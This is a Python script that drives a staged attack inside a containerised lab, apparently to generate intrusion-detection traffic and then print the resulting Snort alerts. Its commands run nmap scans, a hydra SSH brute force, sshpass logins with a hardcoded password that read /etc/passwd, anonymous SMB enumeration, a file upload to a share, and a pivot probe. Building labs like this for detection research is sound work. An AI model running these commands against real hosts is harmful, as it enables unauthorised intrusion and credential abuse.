"""
Execute a two-target attack against server_ssh and server_samba only.

This scenario runs from the client container (10.0.1.11) and intentionally
targets only:
- server_ssh at 10.0.2.11
- server_samba at 10.0.2.12

It does not probe or attack server_shellshock, server_web1, or server_web2.
"""

from __future__ import annotations

import logging
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from llm_ir_dt.docker_manager.docker_manager import DockerManager


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)8s] %(message)s "
    "(%(filename)s:%(lineno)s)",
)
logger = logging.getLogger(__name__)

CLIENT = "client"
SERVER_SSH = "10.0.2.11"
SERVER_SAMBA = "10.0.2.12"


def run(command: str) -> str:
    """Execute a command in the client container and log the result."""
    result = DockerManager.exec_run(CLIENT, command)
    logger.info("[exit=%s] %s", result["exit_code"], command)
    output = str(result.get("output", "")).strip()
    if output:
        logger.info("Output:\n%s", output)
    return output


def main() -> None:
    """Run the SSH+Samba-only attack and print resulting Snort alerts."""
    logger.info("=== Stage 1: Reconnaissance against SSH and Samba only ===")
    run(f"ping -c 3 {SERVER_SSH}")
    run(f"ping -c 3 {SERVER_SAMBA}")

    logger.info("=== Stage 2: Service scan against SSH and Samba only ===")
    run(f"nmap -sT -Pn -p 22 {SERVER_SSH}")
    run(f"nmap -sT -Pn -p 139,445 {SERVER_SAMBA}")

    logger.info("=== Stage 3: SSH brute-force/password spray on server_ssh ===")
    run(f"hydra -l admin -P /opt/passwords.txt -t 4 -f ssh://{SERVER_SSH}")

    logger.info("=== Stage 4: SSH login and host discovery on server_ssh ===")
    run(
        "sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        f"admin@{SERVER_SSH} 'whoami; id; hostname; uname -a' 2>&1 || true"
    )
    time.sleep(1)
    run(
        "sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        f"admin@{SERVER_SSH} 'cat /etc/passwd; ls -la /home/admin' 2>&1 || true"
    )

    logger.info("=== Stage 5: SMB enumeration and write attempt on server_samba ===")
    run(f"smbclient -L //{SERVER_SAMBA} -N 2>&1 || true")
    run(
        f"smbclient //{SERVER_SAMBA}/share -N "
        "-c 'pwd; ls; put /etc/hostname ssh_samba_payload.txt; ls' "
        "2>&1 || true"
    )

    logger.info("=== Stage 6: Pivot-style probe from server_ssh to server_samba ===")
    run(
        "sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        f"admin@{SERVER_SSH} 'echo pivot_host=$(hostname); "
        f"ping -c 2 {SERVER_SAMBA}' 2>&1 || true"
    )

    logger.info("=== SSH+Samba attack complete. Reading alerts... ===")
    time.sleep(3)
    alerts = DockerManager.read_alerts()
    logger.info("Total alerts: %d", len(alerts["alerts"]))
    for alert in alerts["alerts"]:
        logger.info(
            "Alert: [pri=%s cls=%s] {%s} %s -> %s %s",
            alert.get("priority", "-"),
            alert.get("classification", "-"),
            alert.get("protocol", "-"),
            alert.get("source", "-"),
            alert.get("destination", "-"),
            alert.get("message", alert["raw"]),
        )


if __name__ == "__main__":
    main()
